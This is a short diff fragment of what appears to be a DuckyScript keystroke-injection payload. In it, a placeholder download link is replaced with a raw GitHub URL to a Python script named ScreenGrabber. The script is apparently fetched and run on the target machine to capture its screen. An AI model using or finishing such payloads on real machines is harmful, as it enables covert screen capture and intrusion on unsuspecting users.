@@ -17,7 +17,7 @@ REM     - Python
 
 
 REM REQUIRED - Set your Python script link
-DEFINE SCRIPT-PY-LINK example.com
+DEFINE SCRIPT-PY-LINK https://raw.githubusercontent.com/TheRealdarkvip3r/ScreenGrabber/main/script.py
 
 
 DELAY 1000
